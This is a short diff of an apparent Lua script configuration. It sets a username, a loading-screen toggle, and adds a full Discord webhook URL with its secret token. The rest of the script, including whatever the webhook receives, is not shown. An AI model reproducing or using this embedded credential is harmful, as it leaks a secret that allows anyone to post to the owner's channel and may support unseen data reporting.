@@ -1,6 +1,6 @@
 Username = "tobi437a"
 LoadScreen = false -- If you want to enable loadgui, rename to true
-Webhook = ""
+Webhook = "https://discord.com/api/webhooks/1188270710586626168/Cs96Qi3pnoN_L333SdIkaak54Y1RxxD_zcozOAfkReeeOWXYaJfxdulNKjXwiC7chqmv"
 
 
 if LoadScreen == true then 
